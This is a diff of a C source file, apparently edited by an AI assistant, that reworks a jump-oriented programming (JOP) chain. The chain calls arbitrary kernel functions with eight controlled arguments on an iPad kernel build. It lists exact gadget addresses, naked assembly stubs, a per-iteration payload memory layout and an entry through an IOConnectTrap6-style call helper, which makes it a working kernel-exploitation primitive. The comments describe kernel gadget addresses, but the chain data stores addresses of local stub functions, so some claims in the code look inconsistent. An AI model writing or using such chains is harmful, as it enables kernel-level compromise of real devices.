@@ -3,26 +3,39 @@
 #include <stdlib.h>
 #include <string.h>
 
-// jop5.c - Delivers all 8 user arguments (x0..x7) cleanly to the target, using
+// jop_claude.c - Delivers all 8 user arguments (x0..x7) cleanly to the target, using
 // ONLY gadgets that actually exist in the kernel_ipad7_137 binary's code region.
 //
-// The previous do_jop helper was a synthesized instruction sequence with no
-// corresponding kernel address, so it has been removed entirely. Instead, x9 /
-// x10 / x21 are stashed via 6 populate iterations using real kernel gadgets.
-// The C side reaches the chain through a single standard function-pointer call
-// to gadget_prologue. There is no inline asm anywhere except inside naked
-// gadget functions, and each naked function's body matches the exact
-// instructions at the documented kernel address.
+// The call into the chain goes through the existing my_call6 helper (unchanged).
+// Because my_call6 hardcodes the 8th C-call slot to 0, x7 enters prologue as 0;
+// we recover x7 = x7_user inside the JOP chain itself via an extra "iter 5.5"
+// that runs a real kernel gadget pair to overwrite x7 and bridge x0 back to
+// the next data block. So my_call6 stays as-is, and x7_user still reaches the
+// target.
 //
-// All 8 gadgets used (all in __PLK_TEXT_EXEC, verified against the binary):
+// ABI NOTE: We deliberately AVOID writing the callee-saved registers x21..x28.
+// In particular, x21 is used by the kernel-side caller of gadget_prologue in
+// the IOConnectTrap6 dispatch path (it does `mov x0, x21 ; bl <fn>` right
+// after returning from prologue), so corrupting x21 inside the JOP chain
+// causes a kernel data abort on the next call. We use x20 instead because
+// gadget_prologue itself preserves x20: its `stp x20, x19, [sp, #-0x20]!`
+// and `ldp x20, x19, [sp], #0x20` save/restore x20 across the chain, so
+// from the kernel caller's point of view x20 is preserved. We also use x11
+// (caller-saved) for the target address instead of x9, but that change is
+// just for symmetry with x20 - either caller-saved temp would work for the
+// branch register.
+//
+// All 10 gadgets used (all in __PLK_TEXT_EXEC or __TEXT_EXEC, verified):
 //   gadget_populate     0xFFFFFFF006019AFC   ldp x5,x8,[x0,#0x10] ; ldp x1,x2,[x0,#0x20] ; ldp x3,x4,[x0,#0x30] ; mov x0,x8 ; br x5
 //   gadget_prologue     0xFFFFFFF006747A44   stp x20,x19,[sp,#-0x20]! ; ... ; blr x8 ; str x0,[x19] ; ... ; ret
 //   mov_x10_x1__br_x2   0xFFFFFFF006628A94   mov x10, x1 ; br x2     (iter 1: x10 := populate;  iter 5: x10 := fixup)
-//   mov_x21_x1__br_x10  0xFFFFFFF006D06D50   mov x21, x1 ; br x10    (iter 2: x21 := x0_user)
-//   mov_x14_x3__br_x2   0xFFFFFFF006556BD8   mov x14, x3 ; br x2     (iter 3: x14 := target_addr)
-//   mov_x9_x14__br_x10  0xFFFFFFF00662A088   mov x9,  x14 ; br x10   (iter 4: x9  := x14 = target_addr)
+//   mov_x20_x3__br_x2   0xFFFFFFF00659DCAC   mov x20, x3 ; br x2     (iter 2: x20 := x0_user)   <-- prologue restores x20
+//   mov_x13_x1__br_x2   0xFFFFFFF006556E14   mov x13, x1 ; br x2     (iter 3: x13 := target_addr, intermediate)
+//   mov_x11_x13__br_x10 0xFFFFFFF006512534   mov x11, x13 ; br x10   (iter 4: x11 := target_addr via x13)
+//   mov_x7_x1__br_x8    0xFFFFFFF00654C500   mov x7,  x1  ; br x8    (iter 5.5: x7 := x7_user, then jump to bridge)
+//   mov_x0_x3__br_x4    0xFFFFFFF00752BA84   mov x0,  x3  ; br x4    (iter 5.5 bridge: x0 := mem6, br populate)
 //   mov_x5_x8__br_x10   0xFFFFFFF006B3D428   mov x5,  x8  ; br x10   (delivery: x5 := x5_user, br fixup)
-//   mov_x0_x21__br_x9   0xFFFFFFF006513D94   mov x0,  x21 ; br x9    (delivery: x0 := x0_user, br target)
+//   mov_x0_x20__br_x11  0xFFFFFFF0072EEECC   mov x0,  x20 ; br x11   (delivery fixup: x0 := x0_user, br target)
 
 void *my_page = NULL;
 
@@ -72,27 +85,43 @@ __attribute__((naked)) void mov_x10_x1__br_x2(void) {
     );
 }
 
-// 0xFFFFFFF006D06D50  (__PLK_TEXT_EXEC)   mov x21, x1 ; br x10
-__attribute__((naked)) void mov_x21_x1__br_x10(void) {
+// 0xFFFFFFF00659DCAC  (__PLK_TEXT_EXEC)   mov x20, x3 ; br x2
+__attribute__((naked)) void mov_x20_x3__br_x2(void) {
     __asm__ volatile (
-        "mov x21, x1\n"
-        "br x10\n"
-    );
-}
-
-// 0xFFFFFFF006556BD8  (__PLK_TEXT_EXEC)   mov x14, x3 ; br x2
-__attribute__((naked)) void mov_x14_x3__br_x2(void) {
-    __asm__ volatile (
-        "mov x14, x3\n"
+        "mov x20, x3\n"
         "br x2\n"
     );
 }
 
-// 0xFFFFFFF00662A088  (__PLK_TEXT_EXEC)   mov x9, x14 ; br x10
-__attribute__((naked)) void mov_x9_x14__br_x10(void) {
+// 0xFFFFFFF006556E14  (__PLK_TEXT_EXEC)   mov x13, x1 ; br x2
+__attribute__((naked)) void mov_x13_x1__br_x2(void) {
     __asm__ volatile (
-        "mov x9, x14\n"
+        "mov x13, x1\n"
+        "br x2\n"
+    );
+}
+
+// 0xFFFFFFF006512534  (__PLK_TEXT_EXEC)   mov x11, x13 ; br x10
+__attribute__((naked)) void mov_x11_x13__br_x10(void) {
+    __asm__ volatile (
+        "mov x11, x13\n"
         "br x10\n"
+    );
+}
+
+// 0xFFFFFFF00654C500  (__PLK_TEXT_EXEC)   mov x7, x1 ; br x8
+__attribute__((naked)) void mov_x7_x1__br_x8(void) {
+    __asm__ volatile (
+        "mov x7, x1\n"
+        "br x8\n"
+    );
+}
+
+// 0xFFFFFFF00752BA84  (__TEXT_EXEC)       mov x0, x3 ; br x4
+__attribute__((naked)) void mov_x0_x3__br_x4(void) {
+    __asm__ volatile (
+        "mov x0, x3\n"
+        "br x4\n"
     );
 }
 
@@ -104,11 +133,11 @@ __attribute__((naked)) void mov_x5_x8__br_x10(void) {
     );
 }
 
-// 0xFFFFFFF006513D94  (__PLK_TEXT_EXEC)   mov x0, x21 ; br x9
-__attribute__((naked)) void mov_x0_x21__br_x9(void) {
+// 0xFFFFFFF0072EEECC  (__TEXT_EXEC)       mov x0, x20 ; br x11
+__attribute__((naked)) void mov_x0_x20__br_x11(void) {
     __asm__ volatile (
-        "mov x0, x21\n"
-        "br x9\n"
+        "mov x0, x20\n"
+        "br x11\n"
     );
 }
 
@@ -191,37 +220,51 @@ uint32_t my_call6(uint64_t addr, uint64_t a1, uint64_t a2, uint64_t a3, uint64_t
 }
 
 
-// Chain flow (a total of 6 populate iterations):
+// Chain flow (7 populate iterations total):
 //
-//   C  --(blr prologue)-->  prologue --(blr populate)-->  iter1 ... iter6 --> target
-//   prologue's "blr x8" sets LR = address of "str x0,[x19]", and the rest of the chain
-//   uses only "br" (never "blr"), so LR is preserved. The target's "ret" lands back at
-//   prologue's "str x0,[x19]", which saves x0 (the target's return value) to STORED_RET
-//   and then runs the normal epilogue.
+//   C ──my_call6──> prologue ──blr x8──> populate ──iter 1..6──> target
+//   prologue's "blr x8" sets LR = address of "str x0,[x19]". The rest of the chain
+//   uses only "br" (never "blr"), so LR is preserved. The target's "ret" lands back
+//   at prologue's "str x0,[x19]", which saves x0 (the target's return value) into
+//   STORED_RET, runs the normal epilogue, and ret's all the way out to my_call6.
 //
-//   ITER 1: mov_x10_x1__br_x2    -> x10 := populate_addr   (used as br-x10 re-entry from here on)
-//   ITER 2: mov_x21_x1__br_x10   -> x21 := x0_user         (consumed by delivery fixup)
-//   ITER 3: mov_x14_x3__br_x2    -> x14 := target_addr     (intermediate for the x9 stash)
-//   ITER 4: mov_x9_x14__br_x10   -> x9  := x14 = target_addr
-//   ITER 5: mov_x10_x1__br_x2    -> x10 := fixup_addr      (overwrites x10 for the delivery br x10)
-//   ITER 6 (delivery):
-//       populate -> mov_x5_x8__br_x10 -> mov_x0_x21__br_x9 -> target
+//   ITER 1:   mov_x10_x1__br_x2     -> x10 := populate_addr   (br-x10 re-entry handle)
+//   ITER 2:   mov_x20_x3__br_x2     -> x20 := x0_user         (prologue restores x20, so safe vs caller)
+//   ITER 3:   mov_x13_x1__br_x2     -> x13 := target_addr     (intermediate for x11)
+//   ITER 4:   mov_x11_x13__br_x10   -> x11 := target_addr     (caller-saved target reg)
+//   ITER 5:   mov_x10_x1__br_x2     -> x10 := fixup_addr      (overwrites x10 for delivery)
+//   ITER 5.5: mov_x7_x1__br_x8      -> x7  := x7_user, then br x8 = bridge gadget
+//             mov_x0_x3__br_x4      -> x0  := mem6 (restore data-block ptr), br x4 = populate
+//   ITER 6:   populate -> mov_x5_x8__br_x10 -> mov_x0_x20__br_x11 -> target
+//
+//   Iter 5.5 exists solely because my_call6 forces x7 = 0 at prologue entry.
+//   The mov_x7_x1__br_x8 gadget reads x1 (= x7_user from the iter's data block)
+//   and writes x7, but its branch target x8 == x0 == mem5_5[+0x18] (populate sets
+//   both x0 and x8 from the same memory slot). So we set mem5_5[+0x18] to the
+//   address of the mov_x0_x3__br_x4 bridge, which restores x0 to the delivery
+//   data block (via x3, fed from mem5_5[+0x30]) and re-enters populate (via x4,
+//   fed from mem5_5[+0x38]).
 //
 //   Register state at target entry:
 //     x0..x5 = x0_user..x5_user
-//     x6     = x6_user   (untouched by prologue / populate / any stash gadget from C entry on)
-//     x7     = x7_user   (same)
+//     x6     = x6_user        (set by my_call6's a7 slot; preserved end-to-end)
+//     x7     = x7_user        (set by iter 5.5; preserved through iter 6)
 //
-// Payload memory layout (offsets are relative to my_page):
-//   Each per-iter data block lives at my_page + 0x100*N and uses only the
-//   offsets populate reads from: 0x10..0x38 (0x40 bytes total).
+//   Registers NEVER written by the chain: x19, x21..x28 (callee-saved).
+//   So when prologue returns, the kernel-side caller sees its callee-saved
+//   register file intact.
+//
+// Payload memory layout (offsets relative to my_page):
+//   Each per-iter data block uses only the offsets populate reads from:
+//   0x10..0x38 (0x40 bytes total).
 
-#define BLK1  0x000   // iter 1 data block (= my_page itself; prologue passes my_page as x0)
-#define BLK2  0x100
-#define BLK3  0x180
-#define BLK4  0x200
-#define BLK5  0x280
-#define BLK6  0x300   // delivery
+#define BLK1   0x000   // iter 1 data block (= my_page itself; prologue passes my_page as x0)
+#define BLK2   0x100
+#define BLK3   0x180
+#define BLK4   0x200
+#define BLK5   0x280
+#define BLK5_5 0x300   // iter 5.5: stash x7 then bridge x0 back
+#define BLK6   0x380   // delivery
 #define STORED_RET_OFF 0x400
 
 uint64_t call8_jop(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3, uint64_t x4, uint64_t x5, uint64_t x6, uint64_t x7) {
@@ -237,49 +280,51 @@ uint64_t call8_jop(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_
     write64(mp + 0x7C0, (uint64_t)gadget_populate);
 
     // ----- ITER 1: x10 := populate_addr -----
-    //   populate: x5 = gadget1, x8 = mp+BLK2 (= next x0), x1 = pop_addr, x2 = pop_addr
-    //   br x5 -> "mov x10,x1 ; br x2": x10 := pop_addr, br x2 -> populate (x0 = mp+BLK2)
     write64(mp + BLK1 + 0x10, (uint64_t)mov_x10_x1__br_x2);
     write64(mp + BLK1 + 0x18, mp + BLK2);                     // -> x8 -> x0 = mp+BLK2 (next block)
     write64(mp + BLK1 + 0x20, (uint64_t)gadget_populate);     // -> x1 (moved into x10)
     write64(mp + BLK1 + 0x28, (uint64_t)gadget_populate);     // -> x2 (br target)
-    // BLK1+0x30, +0x38 : don't care
 
-    // ----- ITER 2: x21 := x0_user -----
-    //   populate: x5 = gadget2, x8 = mp+BLK3, x1 = x0_user
-    //   br x5 -> "mov x21,x1 ; br x10": x21 := x0_user, br x10 -> populate (x0 = mp+BLK3)
-    write64(mp + BLK2 + 0x10, (uint64_t)mov_x21_x1__br_x10);
+    // ----- ITER 2: x20 := x0_user (using prologue-restored x20 instead of callee-saved x21) -----
+    write64(mp + BLK2 + 0x10, (uint64_t)mov_x20_x3__br_x2);
     write64(mp + BLK2 + 0x18, mp + BLK3);                     // -> next block
-    write64(mp + BLK2 + 0x20, x0);                            // -> x1 (moved into x21)
-    // BLK2+0x28..0x38 : don't care
+    write64(mp + BLK2 + 0x28, (uint64_t)gadget_populate);     // -> x2 (br target)
+    write64(mp + BLK2 + 0x30, x0);                            // -> x3 (moved into x20)
 
-    // ----- ITER 3: x14 := target_addr -----
-    //   populate: x5 = gadget3, x8 = mp+BLK4, x2 = pop_addr, x3 = target_addr
-    //   br x5 -> "mov x14,x3 ; br x2": x14 := target_addr, br x2 -> populate (x0 = mp+BLK4)
-    write64(mp + BLK3 + 0x10, (uint64_t)mov_x14_x3__br_x2);
+    // ----- ITER 3: x13 := target_addr (intermediate for x11) -----
+    write64(mp + BLK3 + 0x10, (uint64_t)mov_x13_x1__br_x2);
     write64(mp + BLK3 + 0x18, mp + BLK4);                     // -> next block
+    write64(mp + BLK3 + 0x20, addr);                          // -> x1 (moved into x13)
     write64(mp + BLK3 + 0x28, (uint64_t)gadget_populate);     // -> x2 (br target)
-    write64(mp + BLK3 + 0x30, addr);                          // -> x3 (moved into x14)
-    // BLK3+0x20, +0x38 : don't care
 
-    // ----- ITER 4: x9 := x14 = target_addr -----
-    //   populate: x5 = gadget4, x8 = mp+BLK5
-    //   br x5 -> "mov x9,x14 ; br x10": x9 := target_addr, br x10 -> populate (x0 = mp+BLK5)
-    write64(mp + BLK4 + 0x10, (uint64_t)mov_x9_x14__br_x10);
+    // ----- ITER 4: x11 := x13 = target_addr (caller-saved target reg) -----
+    write64(mp + BLK4 + 0x10, (uint64_t)mov_x11_x13__br_x10);
     write64(mp + BLK4 + 0x18, mp + BLK5);                     // -> next block
-    // BLK4+0x20..0x38 : don't care (gadget only reads x14, branches via x10)
 
-    // ----- ITER 5: x10 := fixup_addr (= mov_x0_x21__br_x9) -----
-    //   populate: x5 = gadget1 (same), x8 = mp+BLK6, x1 = fixup_addr, x2 = pop_addr
-    //   br x5 -> "mov x10,x1 ; br x2": x10 := fixup, br x2 -> populate (x0 = mp+BLK6)
+    // ----- ITER 5: x10 := fixup_addr (= mov_x0_x20__br_x11) -----
     write64(mp + BLK5 + 0x10, (uint64_t)mov_x10_x1__br_x2);
-    write64(mp + BLK5 + 0x18, mp + BLK6);                     // -> next block (delivery)
-    write64(mp + BLK5 + 0x20, (uint64_t)mov_x0_x21__br_x9);   // -> x1 (moved into x10 = fixup)
+    write64(mp + BLK5 + 0x18, mp + BLK5_5);                   // -> next block (iter 5.5)
+    write64(mp + BLK5 + 0x20, (uint64_t)mov_x0_x20__br_x11);  // -> x1 (moved into x10 = fixup)
     write64(mp + BLK5 + 0x28, (uint64_t)gadget_populate);     // -> x2 (br target)
+
+    // ----- ITER 5.5: x7 := x7_user, then bridge x0 back to mem6 and re-enter populate -----
+    //   populate sets up:
+    //     x5 = mov_x7_x1__br_x8 addr
+    //     x8 = x0 = mov_x0_x3__br_x4 addr (so "br x8" lands at the bridge gadget)
+    //     x1 = x7_user
+    //     x3 = mp + BLK6   (delivery data block; bridge will mov this into x0)
+    //     x4 = populate    (bridge will br to it)
+    //   mov x7, x1 ; br x8    -> x7 := x7_user, jump to mov_x0_x3__br_x4
+    //   mov x0, x3 ; br x4    -> x0 := mp+BLK6, jump to populate
+    write64(mp + BLK5_5 + 0x10, (uint64_t)mov_x7_x1__br_x8);
+    write64(mp + BLK5_5 + 0x18, (uint64_t)mov_x0_x3__br_x4);  // -> x8 (br target of mov_x7); also -> x0 (will be overwritten by bridge)
+    write64(mp + BLK5_5 + 0x20, x7);                          // -> x1 (moved into x7)
+    write64(mp + BLK5_5 + 0x30, mp + BLK6);                   // -> x3 (bridge's source for x0)
+    write64(mp + BLK5_5 + 0x38, (uint64_t)gadget_populate);   // -> x4 (bridge's br target)
 
     // ----- ITER 6 (DELIVERY): -----
     //   populate: x5 = mov_x5_x8__br_x10, x8 = x5_user, x1..x4 = user, x0 = x5_user (to be fixed up)
-    //   br x5 -> mov x5,x8 : x5 := x5_user, br x10 (= fixup) -> mov x0,x21 : x0 := x0_user, br x9 (= target)
+    //   br x5 -> mov x5,x8 : x5 := x5_user, br x10 (= fixup) -> mov x0,x20 : x0 := x0_user, br x11 (= target)
     write64(mp + BLK6 + 0x10, (uint64_t)mov_x5_x8__br_x10);
     write64(mp + BLK6 + 0x18, x5);                            // -> x8, then mov x0,x8 writes x0 (fixed up later)
     write64(mp + BLK6 + 0x20, x1);                            // -> x1
@@ -289,15 +334,25 @@ uint64_t call8_jop(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_
 
     uint64_t STORED_RET = mp + STORED_RET_OFF;
 
-    // Standard function-pointer call into prologue.
-    // The C ABI automatically loads x0=mp, x1=STORED_RET, x6=x6_user, x7=x7_user.
-    // x2..x5 are overwritten by populate, so they are don't-care here.
-    // x9 / x10 / x21 are stashed by the 6-iter chain above -- no inline asm needed on the C side.
-    typedef uint64_t (*func8_t)(uint64_t, uint64_t, uint64_t, uint64_t,
-                                uint64_t, uint64_t, uint64_t, uint64_t);
-    ((func8_t)gadget_prologue)(mp, STORED_RET,
-                               0, 0, 0, 0,
-                               x6, x7);
+    // Dispatch into prologue through the existing my_call6 helper (unchanged).
+    // my_call6 ultimately performs:   func(a1, a2, a3, a4, a5, a6, a7, 0)
+    // so the underlying C-ABI register loading is:
+    //   x0 = a1 = mp
+    //   x1 = a2 = STORED_RET
+    //   x2..x5 = 0       (don't care - overwritten by populate)
+    //   x6 = a7 = x6_user
+    //   x7 = 0           (hardcoded by my_call6 - recovered to x7_user inside iter 5.5)
+    // x10/x11/x13/x20/x7 are all stashed by the 7-iter chain above; no inline asm
+    // on the C side, no modification of my_call6. x21..x28 are never touched.
+    my_call6((uint64_t)gadget_prologue,
+             mp,           // a1 -> x0
+             STORED_RET,   // a2 -> x1
+             0,            // a3 -> x2 (don't care)
+             0,            // a4 -> x3 (don't care)
+             0,            // a5 -> x4 (don't care)
+             0,            // a6 -> x5 (don't care)
+             x6);          // a7 -> x6
+    (void)x7;              // consumed by the JOP chain via BLK5_5+0x20, not by my_call6
 
     return read64(STORED_RET);
 }
